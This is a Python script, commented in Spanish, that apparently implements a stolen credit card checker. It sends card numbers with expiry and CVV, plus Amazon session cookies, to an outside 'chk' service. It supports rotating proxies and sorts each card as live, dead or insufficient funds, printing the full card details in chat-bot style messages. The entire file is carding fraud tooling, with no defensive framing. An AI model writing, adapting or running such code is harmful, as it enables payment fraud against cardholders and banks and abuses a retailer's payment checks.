import requests
import re

def procesar_tarjeta_amazon(card, cookie, use_json=True, proxy_config=None):
    """
    card: str -> formato '4532...|MM|YYYY|CVV' o lista/varias tarjetas si adaptas
    cookie: str o dict -> si es str se enviará en header 'Cookie', si es dict se pasará a session.cookies
    use_json: bool -> intenta enviar como JSON primero (recomendado)
    proxy_config: dict -> ejemplo:
        {
            "user": "username",
            "pass": "password",
            "host": "proxy.soax.com",
            "port": 5000,
            "scheme": "http"  # o "https"
        }
    """

    session = requests.Session()

    # --- Proxy setup (opcional) ---
    if proxy_config:
        scheme = proxy_config.get("scheme", "http")
        user = proxy_config.get("user")
        pwd = proxy_config.get("pass")
        host = proxy_config.get("host")
        port = proxy_config.get("port")

        if user and pwd:
            proxy_auth = f"{user}:{pwd}@"
        else:
            proxy_auth = ""

        proxy_url = f"{scheme}://{proxy_auth}{host}:{port}"
        

    # --- URL / headers / payload ---
    url = "https://leviatan-chk.site/amazon/leviatan"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json, text/plain, */*',
        # Content-Type se ajustará según enviemos json o form
        'Origin': 'https://leviatan-chk.site',
        'Referer': 'https://leviatan-chk.site/amazon/leviatan'
    }

    payload = {
        "lista": card,
        "cookies": cookie if isinstance(cookie, str) else ""
    }

    # Si cookie es dict, pásala a session.cookies (recomendado)
    if isinstance(cookie, dict):
        session.cookies.update(cookie)
        payload["cookies"] = ""  # dejar vacío si no quieres enviar en body

    # Si cookie es string y contiene comillas problemáticas, dejamos que el user la pase limpia.
    if isinstance(cookie, str):
        # envía cookie como header (más fiable que ponerla en el body)
        headers["Cookie"] = cookie

    try:
        # Intentamos primero enviar como JSON (muchas APIs modernas esperan json)
        if use_json:
            headers["Content-Type"] = "application/json"
            resp = session.post(url, json=payload, headers=headers, timeout=30)
        else:
            # enviar como form-encoded
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            resp = session.post(url, data=payload, headers=headers, timeout=30)

        resp.raise_for_status()
        text = resp.text.strip()

        # 1) Si la API responde JSON, parsearlo y devolver info útil
        content_type = resp.headers.get("Content-Type", "")
        if "application/json" in content_type or (text.startswith("{") or text.startswith("[")):
            try:
                j = resp.json()
            except ValueError:
                j = None

            if isinstance(j, dict):
                # intentar mapear campos frecuentes (ajusta según lo que devuelva la API)
                # Ejemplo ficticio:
                status = j.get("status") or j.get("result") or "unknown"
                message = j.get("message") or j.get("msg") or str(j)
                # Si la respuesta trae info de tarjeta, formatearla:
                card_info = j.get("data") or j.get("card") or None

                # Construir mensaje legible
                if status in ("success", "live", "approved") or message.lower().count("aprob"):
                    msg = f"✅ Aprobada\n{message}"
                    return {"status": "live", "message": msg, "cc": card, "raw": j}
                elif status in ("failed", "dead"):
                    msg = f"❌ Rechazada\n{message}"
                    return {"status": "dead", "message": msg, "cc": card, "raw": j}
                else:
                    return {"status": "unknown", "message": message, "cc": card, "raw": j}

        # 2) Si no es JSON, intentar parsear con tu regex sobre HTML
        # detectar cookie expirada (según tu ejemplo)
        if "Erro ao obter acesso passkey" in text or "Tu cookie ha expirado" in text:
            return {"status": "error", "message": "⚠️ Tu cookie ha expirado. Actualízala desde tu cuenta de Amazon.", "cc": card, "raw": text}

        # Tu regex original adaptada (puede necesitar ajustes según HTML real)
        bloques = text.split("<br>")
        for bloque in bloques:
            match = re.search(
                r'class="text-(success|danger)">(.*?)</span> \u2794 '
                r'<span class="text-white">(.*?)</span> \u2794 '
                r'<span class="text-(success|danger)">(.*?)</span> \u2794 '
                r'Tempo de resposta: \((.*?)\) \u2794 '
                r'<span class="text-warning">(.*?)</span>',
                bloque
            )
            if match:
                estado, _, tarjeta, _, respuesta, tiempo, usuario = match.groups()
                partes = tarjeta.split()
                if len(partes) < 7:
                    # Si el formato no es exactamente el esperado, intenta parseo alternativo
                    # ejemplo: "4532...|12|2025|123 VISA Banco Tipo Pais"
                    parts_pipe = tarjeta.split()
                    # fallback minimal
                else:
                    numero, mm, yyyy, cvv = partes[:4]
                    marca = partes[4]
                    banco = " ".join(partes[5:-2])
                    tipo = partes[-2]
                    pais = partes[-1]

                    status = "live" if estado == "success" else "dead"
                    if "insufficient funds" in respuesta.lower():
                        status = "insufficient_funds"

                    mensaje = (
                        f"{'✅ Aprobada' if status == 'live' else '❌ Rechazada'}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"💳 Tarjeta: `{numero}|{mm}|{yyyy}|{cvv}`\n"
                        f"🏦 Banco: {banco}\n"
                        f"💳 Tipo: {marca} • {tipo}\n"
                        f"🌐 País: 🇲🇽 MEXICO\n"
                        f"📌 Institución: {pais}\n"
                        f"📤 Estado: {respuesta.strip()}\n"
                        f"⏱️ Tiempo de respuesta: {tiempo}s\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━"
                    )

                    return {"status": status, "message": mensaje, "cc": card, "raw": bloque}

        # Si llegamos hasta aquí no conseguimos extraer nada útil
        return {"status": "error", "message": "⚠️ No se pudo extraer respuesta de la API.", "cc": card, "raw": text}

    except requests.exceptions.Timeout:
        return {"status": "error", "message": "❌ Timeout al contactar la API.", "cc": card}
    except requests.exceptions.HTTPError as he:
        body = None
        try:
            body = resp.text
        except:
            body = "<no body>"
        return {"status": "error", "message": f"❌ HTTPError: {str(he)} - body: {body}", "cc": card}
    except Exception as e:
        return {"status": "error", "message": f"❌ Error al procesar tarjeta: {str(e)}", "cc": card}
